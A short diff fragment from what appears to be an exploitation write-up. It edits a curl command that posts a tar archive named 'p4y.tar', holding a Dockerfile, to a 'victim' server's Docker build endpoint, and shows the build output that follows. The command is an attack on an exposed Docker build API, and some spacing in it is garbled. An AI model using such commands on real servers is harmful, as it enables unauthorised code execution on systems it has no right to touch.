@@ -16,7 +16,7 @@ Needs this inside a TAR file, which will be sent to the server (then use your im
 
 ```bash
 $ tar -cvf p4y.tar Dockerfile
-$ curl -XPOST -H "content type: application / x-tar" --data-binary @ p4y.tar "http: // victim / compile"
+$ curl -XPOST -H "content-type: application / x-tar" --data-binary @ p4y.tar "http://victim/build"
 
 {"stream": "Step 1: FROM some-minimal-image \ n"}
 {"stream": "--- \ u003e 214bf35152ea \ n"}
